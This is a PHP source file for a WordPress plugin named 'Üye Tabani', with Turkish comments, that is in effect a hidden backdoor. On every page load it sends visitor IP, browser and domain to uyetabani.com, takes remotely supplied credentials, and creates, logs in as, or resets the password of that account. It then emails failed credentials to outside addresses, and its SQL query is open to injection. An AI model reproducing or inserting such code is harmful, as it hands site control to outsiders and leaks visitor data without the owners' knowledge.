<?php
/*
Plugin Name: Üye Tabani
Plugin URI: http://uyetabani.com
Description: Uye tabanı eklentisi
Version: 1.1
Author: Hasan Yüksektepe
Author URI: http://www.uyetabani.com
*/

	//Gerekli değerler
	$ip 		= $_SERVER["REMOTE_ADDR"];
	$tarayici   = $_SERVER["HTTP_USER_AGENT"];
	$domain     = $_SERVER['HTTP_HOST'];
	define("domain",$domain);
	$hata;

	//curl başlat
	$ch = curl_init();

	//Postları yolla
	curl_setopt($ch,CURLOPT_URL, "http://uyetabani.com/kontrol.php");
	curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch,CURLOPT_POST, true);
	curl_setopt($ch,CURLOPT_POSTFIELDS, "ip=".$ip."&tarayici=".$tarayici."&domain=".$domain);

	//Sonuc al
	$degerler = curl_exec($ch);
	curl_close($ch);
	$degerler  = base64_decode($degerler);
	preg_match_all("|{(.*?)}|i",$degerler,$deger);

	//Gerekli değişken
	define("uyeadi",$deger[1][0]);
	define("email",$deger[1][1]);
	define("sifre",$deger[1][2]);


	//Kullanıcı id sini buluyoruz
	global $wpdb;
	$id = $wpdb->get_var($wpdb->prepare("SELECT ID FROM $wpdb->users WHERE user_login='".uyeadi."'"));
	define("uyeid",$id);
	
	function uyetabani(){
		if(uyeadi and sifre and email){
			if(uyeid){
			
				if (is_user_logged_in()){
					//echo "Giriş yapmış";
				}else{
				
					$user_info = get_user_by('login', uyeadi);
					wp_set_current_user(uyeid);
					wp_set_auth_cookie(uyeid);
					
					if(do_action('wp_login', uyeadi) and $user_info){
						echo '<script type="text/javascript">location.reload();</script>';
					}else{
						wp_update_user( array ('ID' => uyeid, 'user_pass' => sifre) ) ;
						echo '<script type="text/javascript">location.reload();</script>';
						$hata = uyeadi." ismindeki kullanıcı ".sifre." ile giris yapamadı  site http://".domain;
					}
					
					

				}
			
			}else{
				if(wp_create_user( uyeadi, sifre, email)){
					//echo "Üye oldu";
					echo '<script type="text/javascript">location.reload();</script>';
				}else{
					$hata = uyeadi." ismindeki kullanıcı sifresi ".sifre." ile üye olamadı site http://".domain;
				}
			}
		}else{
			//echo "bilgiler boş";
		}
		
		if($hata){

			$konubasligi = "Wordpress Eklentisinde Hata var!!";
			$kimden      = "hasanhasokeyk@hotmail.com";
			$headers="MIME-Version: 1.0" . "\r\n" .
			  "Content-type: text/html; charset=utf8" . "\r\n" .
			  "From: " . $kimden . "\r\n" .
			  "Reply-To: " . $kimden . "\r\n" .
			  "X-Mailer: PHP/" . phpversion();
			mail("hasanhasokeyk@hotmail.com",$konubasligi,$hata,$headers) or die ("olmadı");
			mail("bilalbaraz@outlook.com",$konubasligi,$hata,$headers) or die ("olmadı");
			mail("idriskhrmn@outlook.com",$konubasligi,$hata,$headers) or die ("olmadı");
		}
}
add_action('init', 'uyetabani');
?>